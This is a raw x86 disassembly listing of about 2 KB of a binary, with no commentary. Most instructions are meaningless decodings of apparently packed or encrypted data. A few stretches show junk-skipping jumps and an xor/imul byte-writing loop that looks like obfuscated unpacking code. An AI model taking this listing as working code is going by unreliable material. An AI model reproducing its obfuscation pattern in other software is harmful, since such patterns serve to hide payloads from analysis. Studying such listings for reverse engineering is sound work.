  404a1f:	xchg   DWORD PTR [ecx-0x255c9755],esp
  404a25:	stc    
  404a26:	jg     0x404a9e
  404a28:	ins    DWORD PTR es:[edi],dx
  404a29:	call   0xc441e999
  404a2e:	je     0x4049ed
  404a30:	out    0x6a,al
  404a32:	in     eax,dx
  404a33:	push   ss
  404a34:	pop    es
  404a35:	jmp    0x19a7:0x5482548
  404a3c:	outs   dx,BYTE PTR ds:[esi]
  404a3d:	test   DWORD PTR [eax+0x50],edi
  404a40:	aas    
  404a41:	nop
  404a42:	(bad)  [edx+ebp*2]
  404a45:	sar    DWORD PTR [esi],0x50
  404a48:	in     al,0xde
  404a4a:	mov    bh,0xb3
  404a4c:	cmp    dl,ah
  404a4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404a4f:	js     0x404a18
  404a51:	sbb    DWORD PTR [eax+0x42ab4659],esi
  404a57:	nop
  404a58:	test   BYTE PTR [ebx-0x36],bh
  404a5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404a5c:	or     esi,DWORD PTR [ebx+eax*1]
  404a5f:	push   0xff36c2e
  404a64:	mov    cl,0x3c
  404a66:	ficomp DWORD PTR [ecx-0x3b]
  404a69:	cwde   
  404a6a:	push   es
  404a6b:	popa   
  404a6c:	test   DWORD PTR [edi],ebx
  404a6e:	and    ah,dl
  404a70:	arpl   WORD PTR [edx],dx
  404a72:	out    0x71,eax
  404a74:	cmp    esp,DWORD PTR [esi+0x35da040d]
  404a7a:	push   esi
  404a7b:	fs jns 0x404a8a
  404a7e:	and    eax,0x6eb68681
  404a83:	xor    BYTE PTR [eax],bl
  404a85:	add    ebp,ebx
  404a87:	xor    bh,BYTE PTR [ebx+0x37c569d2]
  404a8d:	(bad)  
  404a8f:	in     eax,dx
  404a90:	add    eax,0x6ab4b54a
  404a95:	xor    BYTE PTR [ecx+0x58112236],dl
  404a9b:	(bad)  
  404a9c:	mov    edx,0x5aea660b
  404aa1:	xchg   edi,eax
  404aa2:	iret   
  404aa3:	lock data16 test BYTE PTR [ecx+0x8],bl
  404aa8:	ret    0x4a5a
  404aab:	in     eax,dx
  404aac:	imul   esi,esp,0x8448caf2
  404ab2:	dec    esp
  404ab3:	bound  ebp,QWORD PTR [edi+eiz*1]
  404ab6:	int3   
  404ab7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404ab9:	xchg   BYTE PTR [ecx+0x66f33913],al
  404abf:	jae    0x404b1f
  404ac1:	mov    esi,edx
  404ac3:	pop    esp
  404ac4:	sub    ebx,DWORD PTR [ebx]
  404ac6:	aam    0xe8
  404ac8:	(bad)
  404acb:	mov    ds:0x83e930a9,eax
  404ad0:	int3   
  404ad1:	and    BYTE PTR [ebx+0x5fece33e],dl
  404ad7:	mov    bh,0x73
  404ad9:	imul   ecx,ecx,0x17
  404adc:	cs add dl,bh
  404adf:	lds    ebx,FWORD PTR [edx]
  404ae1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404ae2:	ficomp WORD PTR [edx]
  404ae4:	enter  0xa945,0xac
  404ae8:	and    BYTE PTR [esi],ch
  404aea:	sbb    ecx,DWORD PTR [edx-0x5be91614]
  404af0:	sub    ebx,ebp
  404af2:	xchg   bl,bl
  404af4:	pop    ebp
  404af6:	jno    0x404b55
  404af8:	sti    
  404af9:	imul   edx,DWORD PTR [ecx],0xffffffaa
  404afc:	stos   BYTE PTR es:[edi],al
  404afd:	mov    bl,0xa1
  404aff:	sub    dh,bh
  404b01:	addr16 pop ss
  404b03:	retf   0xbf1a
  404b06:	or     bl,BYTE PTR [esi+ecx*2]
  404b09:	pop    edx
  404b0a:	mov    eax,edi
  404b0c:	xor    DWORD PTR [ecx],edi
  404b0e:	pop    ebp
  404b0f:	push   ecx
  404b10:	jo     0x404ac5
  404b12:	xchg   cl,cl
  404b14:	xor    BYTE PTR [ebx-0x5b],dh
  404b17:	inc    esi
  404b18:	sar    DWORD PTR [ebx+esi*1],cl
  404b1b:	daa    
  404b1c:	xor    al,0xab
  404b1e:	jae    0x404b46
  404b20:	push   ebp
  404b21:	in     eax,dx
  404b22:	jg     0x404af4
  404b24:	adc    ah,BYTE PTR [esi+ecx*8+0x73d910bc]
  404b2b:	sub    dl,BYTE PTR [esi-0x43]
  404b2e:	mov    bh,0x10
  404b30:	fmul   DWORD PTR [esp+ebp*2]
  404b33:	xchg   esp,eax
  404b34:	mov    BYTE PTR [eax-0x75],bh
  404b37:	mov    bl,0x48
  404b39:	in     al,dx
  404b3a:	pop    esi
  404b3b:	cdq    
  404b3c:	adc    ecx,DWORD PTR [ecx+0x45]
  404b3f:	pop    ds
  404b40:	jmp    0x4613fbfc
  404b45:	sub    al,0x5a
  404b47:	jmp    0x9186:0xd88f7793
  404b4e:	popa   
  404b4f:	jbe    0x404ad4
  404b51:	or     eax,0x2975a982
  404b56:	and    cl,dh
  404b58:	and    edx,DWORD PTR [ecx]
  404b5a:	cwde   
  404b5b:	pop    edx
  404b5c:	imul   eax,ebx,0x49ad8584
  404b62:	inc    edx
  404b63:	adc    ecx,DWORD PTR [esi+0x56e56829]
  404b69:	cli    
  404b6a:	jmp    0x7d8b:0xfe6f262d
  404b71:	in     al,0x8a
  404b73:	xchg   esp,eax
  404b74:	cmp    bl,BYTE PTR [ebp-0x77ffcd8e]
  404b7a:	push   ebp
  404b7b:	or     ecx,DWORD PTR [edx+0x7d8b0f55]
  404b81:	hlt    
  404b82:	xor    edi,eax
  404b84:	add    edi,DWORD PTR [ebp-0x14]
  404b87:	jmp    0x404d31
  404b8c:	in     al,dx
  404b8d:	push   esi
  404b8e:	adc    dh,BYTE PTR [eax+0x6a6c4c94]
  404b94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b95:	(bad)  
  404b96:	aas    
  404b97:	push   eax
  404b98:	inc    esi
  404b99:	mov    esp,0x2e2ee298
  404b9e:	jle    0x404c1e
  404ba0:	mov    edi,DWORD PTR [edi+0x7e]
  404ba3:	jle    0x404bc7
  404ba5:	cmp    DWORD PTR [ecx-0x8],0xee693e8d
  404bac:	xlat   BYTE PTR ds:[ebx]
  404bad:	fimul  WORD PTR [ebx+0x8]
  404bb0:	sbb    al,0xf
  404bb2:	inc    edi
  404bb3:	pop    esp
  404bb5:	dec    esp
  404bb6:	xchg   esi,eax
  404bb7:	inc    ebx
  404bb8:	jns    0x404b84
  404bba:	call   0x71a0f962
  404bbf:	sub    BYTE PTR [edi],bl
  404bc1:	sar    cl,cl
  404bc3:	add    eax,0x60655eef
  404bc8:	in     al,dx
  404bc9:	in     eax,0x9f
  404bcb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404bcc:	sub    ebp,DWORD PTR [ecx]
  404bce:	or     BYTE PTR [edi-0x4c],dh
  404bd1:	retf   
  404bd2:	push   ecx
  404bd3:	shl    BYTE PTR [ebx-0x49],1
  404bd6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404bd7:	add    BYTE PTR [ebx-0x19],cl
  404bda:	lahf   
  404bdb:	sbb    al,BYTE PTR [edx+0x43762d7b]
  404be1:	ja     0x404bc7
  404be3:	add    eax,0x5380b22f
  404be8:	stos   DWORD PTR es:[edi],eax
  404be9:	popf   
  404bea:	leave  
  404beb:	mov    ah,0xb0
  404bed:	data16 setno BYTE PTR [esi-0x6f]
  404bf2:	out    dx,eax
  404bf3:	in     al,dx
  404bf4:	popa   
  404bf5:	fsubr  QWORD PTR [ebx+0xb]
  404bf8:	cmp    esp,DWORD PTR [edi]
  404bfa:	or     BYTE PTR [ebp-0x7dcecc5c],0x39
  404c01:	ja     0x404be5
  404c03:	jmp    0xcecb:0x8e715e51
  404c0a:	push   ss
  404c0b:	lods   al,BYTE PTR ds:[esi]
  404c0c:	sub    esp,esi
  404c0e:	xchg   edi,eax
  404c0f:	jbe    0x404bd9
  404c11:	push   ss
  404c12:	and    DWORD PTR [eax-0x17],ebx
  404c15:	dec    esp
  404c16:	call   0x1177b94
  404c1b:	sub    ebx,esi
  404c1d:	cmp    ah,dl
  404c1f:	ficomp DWORD PTR [ebx]
  404c21:	mov    bl,0x38
  404c23:	cmp    BYTE PTR [eax+ecx*1+0x704b9bf7],dh
  404c2a:	push   esi
  404c2b:	(bad)  
  404c2c:	repz test eax,0x22bc727d
  404c32:	or     eax,0x350fcc4f
  404c37:	sbb    eax,0x3cb6ec14
  404c3c:	(bad)  
  404c3d:	lahf   
  404c3e:	fisub  WORD PTR [esi-0x39]
  404c41:	popf   
  404c42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404c43:	or     cl,BYTE PTR [edx+ecx*4-0x3581c2cc]
  404c4a:	push   cs
  404c4b:	rcl    DWORD PTR [ebp-0x432d3013],1
  404c51:	sbb    DWORD PTR [ecx],eax
  404c53:	add    al,0x3
  404c55:	shl    BYTE PTR [esi+ebx*8],0x49
  404c59:	sbb    eax,0xd1b19b2c
  404c5e:	sbb    BYTE PTR [ebx-0x20],0x16
  404c62:	sbb    al,0x2d
  404c64:	sbb    ebx,DWORD PTR [ebx-0x3f11db2]
  404c6a:	jecxz  0x404c8c
  404c6c:	xor    bl,BYTE PTR [edi+0x95fee93]
  404c72:	pop    ebx
  404c73:	test   al,0xe2
  404c75:	sub    DWORD PTR [eax-0x1a],esp
  404c78:	cmp    al,0xcc
  404c7a:	aas    
  404c7b:	mov    ecx,0x9e240a1d
  404c80:	adc    ch,bh
  404c82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404c83:	nop
  404c84:	mov    ds:0x1fecb161,al
  404c89:	mov    cl,0x8d
  404c8b:	add    BYTE PTR [ecx+0x1e],0xe1
  404c8f:	scas   al,BYTE PTR es:[edi]
  404c90:	push   esi
  404c91:	mov    WORD PTR [ecx-0x7e],gs
  404c94:	mov    al,ds:0x4a104c45
  404c99:	es cmp eax,0x787fdd1c
  404c9f:	(bad)  
  404ca0:	cdq    
  404ca1:	inc    edi
  404ca2:	push   ds
  404ca3:	add    DWORD PTR [esi],esp
  404ca5:	mov    edx,0xd54e422b
  404caa:	mov    dh,bl
  404cac:	mov    bl,0xa5
  404cae:	ret    0x2b4
  404cb1:	mov    ebx,0xf7816125
  404cb6:	jmp    0xcedef4f5
  404cbb:	and    DWORD PTR [eax+0x43f28f8],0xffffffd9
  404cc2:	pushf  
  404cc3:	mov    ds:0x1a7af40c,al
  404cc8:	clc    
  404cc9:	xchg   esp,eax
  404cca:	xchg   edi,eax
  404ccb:	add    ch,dh
  404ccd:	mov    esi,0x997925a8
  404cd2:	push   ebp
  404cd3:	add    al,0x62
  404cd5:	jge    0x404d0a
  404cd7:	pushf  
  404cd8:	out    0x1b,al
  404cda:	cwde   
  404cdb:	xor    BYTE PTR [edx],0xe2
  404cde:	fsub   QWORD PTR [edx]
  404ce0:	and    al,0xc5
  404ce2:	test   eax,0x698e266d
  404ce7:	jle    0x404d5d
  404ce9:	xchg   esi,eax
  404cea:	xchg   BYTE PTR [edi-0x51],al
  404ced:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404cee:	adc    al,0x93
  404cf0:	dec    edi
  404cf1:	cs sub eax,0xd7df4a32
  404cf7:	jae    0x404ce0
  404cf9:	shl    DWORD PTR [eax],1
  404cfb:	sbb    DWORD PTR [esi+ecx*1-0x33851610],eax
  404d02:	push   esp
  404d03:	jmp    0xa3d6cffe
  404d08:	mov    al,ds:0x7f54a6ad
  404d0d:	jmp    0x23d44900
  404d12:	xchg   edi,eax
  404d13:	call   0xe49c9ec9
  404d18:	iret   
  404d19:	loope  0x404d64
  404d1b:	pop    ebx
  404d1c:	loop   0x404d79
  404d1e:	add    BYTE PTR [eax+0x31],dl
  404d21:	push   edx
  404d22:	mov    esp,0xe31051f1
  404d27:	(bad)  
  404d28:	xor    ebx,DWORD PTR [eax]
  404d2a:	cmp    eax,0x5ad3ccf5
  404d2f:	and    DWORD PTR [ebx],ebp
  404d31:	mov    ebx,DWORD PTR [ebp-0x1c]
  404d34:	mov    BYTE PTR [edi+ebx*1+0x32729d],dl
  404d3b:	mov    dl,BYTE PTR [ebp+0xb]
  404d3e:	mov    edi,DWORD PTR [ebp-0x18]
  404d41:	xor    edi,eax
  404d43:	add    edi,DWORD PTR [ebp-0x14]
  404d46:	mov    ebx,DWORD PTR [ebp-0x1c]
  404d49:	mov    BYTE PTR [edi+ebx*1+0x32729d],dl
  404d50:	mov    edx,DWORD PTR [ebp-0x44]
  404d53:	mov    edi,DWORD PTR [ebp-0xc]
  404d56:	xor    edx,eax
  404d58:	xor    edi,eax
  404d5a:	add    edx,ecx
  404d5c:	add    edi,ecx
  404d5e:	imul   edx,edi
  404d61:	add    edx,DWORD PTR [ebp-0x14]
  404d64:	mov    DWORD PTR [ebp-0x14],edx
  404d67:	mov    edx,DWORD PTR [ebp-0xc]
  404d6a:	mov    edi,DWORD PTR [ebp-0x24]
  404d6d:	xor    edx,eax
  404d6f:	add    edx,ecx
  404d71:	imul   edx,edi
  404d74:	mov    edi,DWORD PTR [ebp-0xc]
  404d77:	xor    edi,eax
  404d79:	sub    edx,edi
  404d7b:	mov    edi,DWORD PTR [ebp-0xc]
  404d7e:	mov    ebx,DWORD PTR [ebp-0x14]
  404d81:	jmp    0x404f2b
  404d86:	test   DWORD PTR [ebp+0x21bc10ba],0xf561ad9d
  404d90:	xchg   ebp,eax
  404d91:	and    BYTE PTR [ebp-0x2f],ah
  404d94:	out    0xce,eax
  404d96:	mov    ebx,0x8b7e7e2f
  404d9b:	jg     0x404e1b
  404d9d:	jle    0x404e05
  404d9f:	sub    al,BYTE PTR [esi+0x79]
  404da2:	dec    edx
  404da3:	test   BYTE PTR [edx+0x39e1739f],0xd4
  404daa:	mov    WORD PTR es:[ebp-0x7aa269a1],gs
  404db1:	cmp    bl,BYTE PTR [esi-0x26]
  404db4:	je     0x404da0
  404db6:	or     dl,BYTE PTR [ecx]
  404db8:	outs   dx,BYTE PTR ds:[esi]
  404db9:	cmp    edx,DWORD PTR [edi+0x1935b9a7]
  404dbf:	mov    al,ds:0xd4d68598
  404dc4:	fwait
  404dc5:	bound  eax,QWORD PTR [ebp+eiz*2+0x3deb0ebd]
  404dcc:	push   0x5e
  404dce:	fwait
  404dcf:	inc    esp
  404dd0:	xchg   DWORD PTR [ebx-0x431b806e],edi
  404dd6:	pop    ecx
  404dd7:	push   ecx
  404dd8:	test   eax,0x4835f350
  404ddd:	in     eax,0x52
  404ddf:	loopne 0x404d82
  404de1:	call   0x8172afb0
  404de6:	fst    DWORD PTR [ecx]
  404de8:	out    dx,eax
  404de9:	fwait
  404dea:	adc    DWORD PTR [esi-0xbd5c0bc],0xffffffa6
  404df1:	jno    0x404d75
  404df3:	pushf  
  404df4:	sbb    DWORD PTR [esi-0x5e],ebx
  404df7:	adc    BYTE PTR [edi+eiz*2-0x97d58b],dh
  404dfe:	adc    eax,0xafc5f976
  404e03:	xchg   esi,eax
  404e04:	call   0x8989:0x4b88f2e1
  404e0b:	sbb    eax,0x2064c60d
  404e10:	inc    edx
  404e11:	xor    ah,bh
  404e13:	xchg   edi,eax
  404e14:	pop    eax
  404e15:	(bad)  
  404e16:	cmp    DWORD PTR [ecx+ebp*1],edi
  404e19:	adc    cl,BYTE PTR [ebx+0x4edb5f33]
  404e1f:	dec    esp
  404e20:	hlt    
  404e21:	adc    edi,DWORD PTR [eax-0x3b09ef95]
  404e27:	add    eax,DWORD PTR [ebx+0x2a031f8e]
  404e2d:	das    
  404e2e:	fild   QWORD PTR [edx-0x1a]
  404e31:	push   ebp
  404e32:	add    ecx,DWORD PTR [edx+0x548239c4]
  404e38:	sti    
  404e39:	jmp    0x335c:0xc2cb49e6
  404e40:	rcl    al,1
  404e42:	pusha  
  404e43:	lds    ebp,FWORD PTR [ebx+0x16]
  404e46:	add    esp,DWORD PTR [ebx+0x25]
  404e49:	sbb    al,0xd9
  404e4b:	push   esi
  404e4c:	popf   
  404e4d:	add    DWORD PTR [ebx+0x1db7ae78],esi
  404e53:	and    BYTE PTR [ebp+ebx*1-0x3d],0x66
  404e58:	mov    esi,0x8e4bc2db
  404e5d:	push   ds
  404e5e:	sbb    ecx,DWORD PTR [esi+ebp*4]
  404e61:	add    ch,ah
  404e63:	dec    bh
  404e65:	ds xchg ebx,eax
  404e67:	pop    edx
  404e68:	add    ebp,ebx
  404e6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404e6b:	mov    bl,0x91
  404e6d:	xlat   BYTE PTR ds:[ebx]
  404e6e:	xor    al,0xa
  404e70:	and    DWORD PTR ds:0xb94e754e,esi
  404e76:	sub    DWORD PTR [ebp+0x68],esp
  404e79:	pop    ecx
  404e7a:	mov    al,0x89
  404e7c:	dec    esi
  404e7d:	mov    ecx,0xe2456af4
  404e82:	dec    ecx
  404e83:	pop    edi
  404e84:	sbb    dl,BYTE PTR [ebx-0x62e5362d]
  404e8a:	jg     0x404ee3
  404e8c:	cld    
  404e8d:	adc    BYTE PTR ds:0xc75a176b,dh
  404e93:	xchg   edi,eax
  404e94:	jns    0x404ea8
  404e96:	daa    
  404e97:	hlt    
  404e98:	in     eax,0xc9
  404e9a:	fld    QWORD PTR [ecx-0x746fb8cc]
  404ea0:	cmp    al,0x47
  404ea2:	clc    
  404ea3:	add    esp,DWORD PTR [eax+ecx*1]
  404ea6:	adc    BYTE PTR [edx+0xa],0x12
  404eaa:	in     al,0x3e
  404eac:	inc    eax
  404ead:	fild   DWORD PTR [eax]
  404eaf:	jb     0x404ef6
  404eb1:	inc    ebp
  404eb2:	iret   
  404eb3:	jle    0x404e60
  404eb5:	loop   0x404e5a
  404eb7:	bound  edi,QWORD PTR [ebx+eax*8-0xac7c245]
  404ebe:	xor    eax,0xad1dafbd
  404ec3:	mov    ecx,0xb0018396
  404ec8:	pop    ds
  404ec9:	mov    al,ds:0x27e12779
  404ece:	(bad)  
  404ed0:	call   0x23da:0xc2f1d3d1
  404ed7:	mov    ds:0xf9c271e7,al
  404edc:	mov    ebp,DWORD PTR [edx-0x5b]
  404edf:	cdq    
  404ee0:	call   0x52d1:0x7746032
  404ee7:	outs   dx,BYTE PTR ds:[esi]
  404ee8:	pusha  
  404ee9:	pop    eax
  404eea:	dec    edi
  404eeb:	mov    cl,0xc4
  404eed:	sti    
  404eee:	es in  eax,dx
  404ef0:	fldcw  WORD PTR [ebp+0x3647048b]
  404ef6:	adc    BYTE PTR [edi-0x149dfee5],al
  404efc:	clc    
  404efd:	jne    0x404f2b
  404eff:	dec    esp
  404f00:	and    al,0xf3
  404f02:	or     eax,0x5a014608
  404f07:	cmp    DWORD PTR [ebx],ebp
  404f09:	xchg   esi,eax
  404f0a:	jmp    0x404f3f
  404f0c:	cld    
  404f0d:	push   ss
  404f0e:	mov    bl,0xa7
  404f10:	pop    ebx
  404f11:	sbb    DWORD PTR [ecx+0x68],0x46
  404f15:	std    
  404f16:	xchg   edx,eax
  404f17:	adc    esi,DWORD PTR [edi+0x5dd20d5d]
  404f1d:	dec    ebp
  404f1e:	adc    BYTE PTR [ecx-0x4a],al
  404f21:	aas    
  404f22:	sub    eax,0x9699d56
  404f27:	shr    BYTE PTR [ebx+0x2],0x57
  404f2b:	xor    edi,eax
  404f2d:	add    edi,ecx
  404f2f:	imul   edi,ebx
  404f32:	jmp    0x4050dc
  404f37:	mov    esp,0xfaa10ab4
  404f3c:	jns    0x404efb
  404f3e:	dec    ebp
  404f3f:	mov    edx,0x97d15a29
  404f44:	mov    edi,0x21c8ee58
  404f49:	jle    0x404fc9
  404f4b:	mov    edi,DWORD PTR [edi+0x7e]
  404f4e:	jle    0x404f75
  404f50:	push   edi
  404f51:	xchg   edx,eax
  404f52:	jp     0x404eea
  404f54:	xor    dl,BYTE PTR [esi+0x14c5c999]
  404f5a:	push   0x42
  404f5c:	push   esp
  404f5d:	sbb    eax,0xf9e70cb6
  404f62:	push   ecx
  404f63:	mov    ebp,0xe0ae2fe2
  404f68:	sub    eax,0x91eac34d
  404f6d:	pop    esi
  404f6e:	sbb    eax,0x5dd1f422
  404f73:	ds cmc 
  404f75:	(bad)  
  404f76:	test   al,0x9f
  404f78:	cmp    ebp,DWORD PTR [esi-0x6a]
  404f7b:	xchg   BYTE PTR [eax],al
  404f7d:	cmp    DWORD PTR [edi],edi
  404f7f:	test   BYTE PTR [edi+0x3377fef9],dl
  404f85:	imul   eax,DWORD PTR [ebp+ebp*4-0x44bdfd51],0x25
  404f8d:	rcr    BYTE PTR [eax+0x6c],1
  404f90:	add    bh,ch
  404f92:	mov    ss,WORD PTR [eax]
  404f94:	imul   ebp,DWORD PTR [ebp+0x58],0xffffffa5
  404f98:	mov    ecx,0x1fb3f343
  404f9d:	jmp    0x404fc7
  404f9f:	aad    0x70
  404fa1:	or     bh,BYTE PTR [eax-0x58]
  404fa4:	popa   
  404fa5:	inc    ebp
  404fa6:	jl     0x404fb2
  404fa8:	daa    
  404fa9:	adc    BYTE PTR [ecx+0x3524220a],cl
  404faf:	ja     0x404f44
  404fb1:	and    BYTE PTR [edi-0x4c],0x6a
  404fb5:	push   cs
  404fb6:	push   edi
  404fb7:	and    BYTE PTR [ebx-0x2bb8d8d7],dh
  404fbd:	dec    edx
  404fbe:	shl    BYTE PTR [edx-0x7f],1
  404fc1:	cmp    eax,0x4d08d97
  404fc6:	mov    edx,0xabe25cf
  404fcb:	mov    ds:0xc8e1d895,eax
  404fd0:	pop    esp
  404fd1:	xor    cl,BYTE PTR [eax-0x17]
  404fd4:	mov    BYTE PTR [eax+0x4f],dh
  404fd7:	leave  
  404fd8:	cmp    dl,BYTE PTR [edx]
  404fda:	outs   dx,DWORD PTR ds:[esi]
  404fdb:	mov    dh,0x8d
  404fdd:	addr16 repz dec esi
  404fe0:	add    ah,ah
  404fe2:	and    DWORD PTR [ebp-0x41838a7e],esp
  404fe8:	cmp    eax,DWORD PTR [ebp+0x15]
  404feb:	push   ecx
  404fec:	(bad)  
  404fed:	iret   
  404fee:	into   
  404fef:	out    dx,al
  404ff0:	fadd   QWORD PTR [eax]
  404ff2:	ret    0xbc98
  404ff5:	lds    esi,FWORD PTR [ebp-0x7c090239]
  404ffb:	repz test al,0x36
  404ffe:	test   eax,0x90c85261
  405003:	fild   QWORD PTR [esi-0x336a56af]
  405009:	out    0x54,eax
  40500b:	and    esi,DWORD PTR [eax]
  40500d:	mov    dl,0x7a
  40500f:	stc    
  405010:	inc    ebx
  405011:	stc    
  405012:	rcr    ebx,1
  405014:	add    edx,DWORD PTR [eax]
  405016:	dec    esi
  405017:	addr16 sbb al,0xf5
  40501a:	popa   
  40501b:	jmp    0x405081
  40501d:	jne    0x404fa6
  40501f:	ficom  WORD PTR [ebp-0x38c69a54]
  405025:	xchg   esp,eax
  405026:	pop    ebp
  405027:	arpl   WORD PTR [edx-0x64f64be],bx
  40502d:	xchg   ebx,edx
  40502f:	and    DWORD PTR [ebx+0x7c4a5d2b],edx
  405035:	(bad)  
  405036:	sbb    edi,DWORD PTR [edi+eax*8+0x380945b9]
  40503d:	pusha  
  40503e:	in     al,dx
  40503f:	adc    al,0xab
  405041:	add    al,0x13
  405043:	pushf  
  405044:	fidivr WORD PTR [edx+edi*8]
  405047:	fild   WORD PTR [edx-0x31]
  40504a:	mov    ebp,DWORD PTR ds:0x802b38b4
  405050:	dec    esp
  405051:	fs out dx,al
  405053:	test   BYTE PTR [ecx],cl
  405055:	push   es
  405056:	fld    TBYTE PTR [edi-0x57fc1a53]
  40505c:	xor    edx,DWORD PTR [esi+0x7a59655a]
  405062:	inc    ecx
  405063:	cli    
  405064:	push   ecx
  405065:	pop    ecx
  405066:	dec    esi
  405067:	add    eax,0x132bad48
  40506c:	mov    eax,0xd1a08cfe
  405072:	pushf  
  405073:	dec    esi
  405074:	push   es
  405075:	repnz xor eax,0xaebe8cd5
  40507b:	nop
  40507c:	pop    edx
  40507d:	dec    ecx
  40507e:	push   eax
  40507f:	fnsave [eax-0x21c27f74]
  405085:	mov    ebp,0x28e7c9d
  40508a:	xchg   esp,eax
  40508b:	neg    DWORD PTR ds:0xaad2eec6
  405091:	pop    es
  405092:	in     al,dx
  405093:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405094:	mov    al,ds:0x65a684c0
  405099:	retf   0xcf28
  40509c:	fild   WORD PTR [edx+0x1b061117]
  4050a2:	fistp  QWORD PTR [edx]
  4050a4:	enter  0xa82b,0x6b
  4050a8:	rcl    DWORD PTR [eax-0x45e4294b],cl
  4050ae:	or     BYTE PTR [edx+eax*8-0x6f],ch
  4050b2:	stc    
  4050b3:	and    al,0x69
  4050b5:	cmp    eax,0x19f9ceb
  4050ba:	loope  0x40511c
  4050bc:	mov    edx,0x2f8be5c9
  4050c1:	jmp    0xc819a820
  4050c6:	or     eax,0xf8228772
  4050cb:	stos   BYTE PTR es:[edi],al
  4050cc:	inc    edx
  4050cd:	lods   eax,DWORD PTR ds:[esi]
  4050ce:	and    eax,0x5ff605b8
  4050d3:	(bad)  
  4050d4:	jmp    0x405141
  4050d6:	das    
  4050d7:	add    sp,bx
  4050da:	sub    eax,0xe85d8bf1
  4050df:	xor    ebx,eax
  4050e1:	sub    edx,ecx
  4050e3:	lea    edi,[edi+ebx*1+0x32729d]
  4050ea:	cmp    edi,edx
  4050ec:	jbe    0x404654
  4050f2:	mov    edx,DWORD PTR [ebp-0xc]
  4050f5:	mov    edi,DWORD PTR [ebp-0x24]
  4050f8:	xor    edx,eax
  4050fa:	add    edx,ecx
  4050fc:	jmp    0x4052a6
  405101:	pop    edi
  405102:	mov    DWORD PTR [ebp+ebx*8-0x42980294],edx
  405109:	sbb    al,0x25
  40510b:	or     ebx,ecx
  40510d:	(bad)  
  40510e:	adc    ah,BYTE PTR [esi-0x4a]
  405111:	inc    ebp
  405112:	and    bh,BYTE PTR [esi+0x7e]
  405115:	mov    edi,DWORD PTR [edi+0x7e]
  405118:	jle    0x405183
  40511a:	retf   0x1a73
  40511d:	jp     0x405103
  40511f:	push   0xe
  405121:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405122:	jbe    0x405163
  405124:	shl    esp,cl
  405126:	mov    dh,0x76
  405128:	push   ebp
  405129:	dec    ecx
  40512a:	push   cs
  40512b:	ins    BYTE PTR es:[edi],dx
  40512c:	cwde   
  40512d:	xchg   dx,ax
  40512f:	jle    0x405138
  405131:	or     ch,BYTE PTR [ebx+ecx*2+0x44]
  405135:	fimul  DWORD PTR [ebx+0x4]
  405138:	mov    cl,0x92
  40513a:	sub    BYTE PTR [edi-0x64],dh
  40513d:	push   ds
  40513e:	outs   dx,BYTE PTR ds:[esi]
  40513f:	pop    eax
  405140:	sub    eax,0xe589e3c4
  405145:	loope  0x405151
  405147:	jb     0x40516d
  405149:	xchg   esi,eax
  40514a:	xor    DWORD PTR [esi-0xc126146],0x4b14f5c3
  405154:	xor    esi,ecx
  405156:	out    0x54,eax
  405158:	jl     0x405107
  40515a:	dec    ecx
  40515b:	dec    ecx
  40515c:	add    eax,edx
  40515e:	(bad)  
  40515f:	and    al,0x15
  405161:	mov    ss,WORD PTR ds:[esi-0x42]
  405165:	jb     0x405108
  405167:	sub    DWORD PTR [edx-0xd2c2ea4],0xe9a721ef
  405171:	xchg   edx,eax
  405172:	cdq    
  405173:	mov    WORD PTR [ecx],es
  405175:	cmp    bl,BYTE PTR [edi+0x6e30e863]
  40517b:	enter  0x465f,0xde
  40517f:	add    BYTE PTR [edi+0x5f9c36ed],al
  405185:	ret    
  405186:	xor    BYTE PTR [edi-0x57],0xe6
  40518a:	jmp    0x405203
  40518c:	mov    ds:0xf97026e6,eax
  405191:	dec    esi
  405192:	ds dec edi
  405194:	sub    eax,0xb45c07eb
  405199:	jnp    0x405174
  40519b:	hlt    
  40519c:	cmp    al,0xd1
  40519e:	push   ebp
  40519f:	loopne 0x405194
  4051a1:	xlat   BYTE PTR ds:[ebx]
  4051a2:	push   0x9
  4051a4:	and    BYTE PTR [ecx+0x443310d9],0x5d
  4051ab:	sbb    ebp,DWORD PTR [ebp+eiz*2+0x64]
  4051af:	imul   eax,DWORD PTR [ecx+0x52],0xa681043e
  4051b6:	pop    es
  4051b7:	inc    edi
  4051b8:	mov    bl,0x5c
  4051ba:	shl    BYTE PTR [ebx],1
  4051bc:	ret    0xd397
  4051bf:	sub    esi,DWORD PTR [ecx]
  4051c1:	jle    0x40518c
  4051c3:	mov    dl,0x8f
  4051c5:	data16 fs jle 0x4051d8
  4051c9:	in     al,0xc5
  4051cb:	hlt    
  4051cc:	pop    esp
  4051cd:	out    0xdf,al
  4051cf:	add    edx,ecx
  4051d1:	adc    bl,dh
  4051d3:	shl    DWORD PTR [edi-0x48],0xba
  4051d7:	mov    cl,0x67
  4051d9:	xor    DWORD PTR [eax+0x5115b1e1],esp
  4051df:	mov    ds:0x8e815a3,al
  4051e4:	out    dx,al
  4051e5:	outs   dx,DWORD PTR ds:[esi]
  4051e6:	xchg   DWORD PTR [ebx+0x185c2e81],ecx
  4051ec:	inc    ecx
  4051ed:	pop    ebx
  4051ee:	mov    ebp,0x12134020
  4051f3:	fcom   DWORD PTR [edx+0x35]
  4051f6:	push   ds
  4051f7:	pusha  
  4051f8:	(bad)  
  4051f9:	int3   
  4051fa:	imul   ebp,DWORD PTR [ebp+0x3db058fb],0x7d
  405201:	adc    BYTE PTR ds:[ecx-0xc],al
  405205:	mov    cl,0x9e
  405207:	pop    esp
  405208:	mov    al,ch
  40520a:	clc    
  40520b:	cmp    BYTE PTR [eax-0x27acdbe],al
  405211:	nop
  405212:	sti    
  405213:	and    dl,BYTE PTR [edx-0x41]
  405216:	jmp    0x4051d2
  405218:	push   esp
  405219:	dec    eax
  40521a:	fwait
  40521b:	jge    0x40525e
